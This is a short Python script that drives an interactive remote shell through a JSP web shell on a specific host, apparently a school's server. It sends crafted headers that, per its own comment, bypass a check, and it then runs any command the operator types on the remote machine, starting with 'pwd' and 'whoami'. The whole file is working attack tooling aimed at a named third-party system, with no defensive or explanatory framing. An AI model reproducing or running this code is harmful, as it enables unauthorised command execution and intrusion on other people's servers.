import requests

from hack import password

class Sender:
    def __init__(self):
        self.door = password.door
        self.get_headers = {
            "prefix": "<%",
            "suffix": "%>//",
            # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
            "c": "Runtime",
        }
        self.url = r"http://js.bischofberger.schule:18080/" + str(self.door) + ".jsp?pwd=j&cmd="

        self.current_path = ""

    def send(self, c:str)->str:
        ret = requests.get(self.url + c, headers=self.get_headers, verify=False)
        string = ret.content.decode()
        if string[:2] == '//':
            return ""
        else:
            return string.split('\x00')[0]

if __name__ == "__main__":
    s = Sender()
    while True:
        path:str = s.send("pwd").strip()
        usr: str = s.send("whoami").strip()
        c = input(f"[{usr}@{path}]$ ")
        print(s.send(c).strip())